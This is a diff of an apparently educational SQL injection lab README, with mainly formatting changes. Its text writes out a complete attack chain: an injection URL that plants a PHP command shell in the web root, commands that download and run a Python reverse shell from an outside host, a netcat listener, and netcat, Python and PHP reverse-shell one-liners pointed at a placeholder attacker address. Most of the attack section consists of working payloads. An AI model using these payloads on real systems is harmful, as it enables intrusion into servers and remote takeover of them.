@@ -35,18 +35,18 @@ I have added an example of how to exploit an SQL Injection vulnerability by chan
 <a href="sql-injection-play.php">SQL Injection Play</a>. You need to reload the page to see the results as the select query is executed before the update request.
 
 
-Gain Access to Webserver with SQL Injection
+Gain Shell Access to Webserver with the Help of SQL Injection
 -------------------------------------------
 
-Create a PHP script that will run commands
-http://10.0.2.2/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;
+Create a PHP script that will run commands  
+http://10.0.2.2/sql-injection/outfile.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/cmd.php%22;  
 
-PYTHON BACKDOOR
+__PYTHON BACKDOOR__
 
-Download Python reverse shell
+Download Python reverse shell  
 http://10.0.2.2/images/cmd.php?cmd=wget%20http://10.0.2.2/scripts/reverse-shell.py -O /tmp/reverse-shell.py
 
-Run new Python backdoor script
+Run new Python backdoor script  
 http://10.0.2.2/images/cmd.php?cmd=/tmp/reverse-shell.py
 
 
@@ -55,16 +55,16 @@ http://10.0.2.2/images/cmd.php?cmd=/tmp/reverse-shell.py
 NOTES
 ----------
 
-Setup host machine for incoming connections:
+Setup host machine for incoming connections:  
 `nc -nvlp 4444`
 
-Run reverse shell command on foreign machine:
+__Run reverse shell command on foreign machine:__
 
-Netcat reverse shell:
+Netcat reverse shell:  
 `nc.traditional -e /bin/sh <host> 4444`
 
-Python reverse shell:
+Python reverse shell:  
 `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
 
-PHP reverse shell:
+PHP reverse shell:  
 `php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
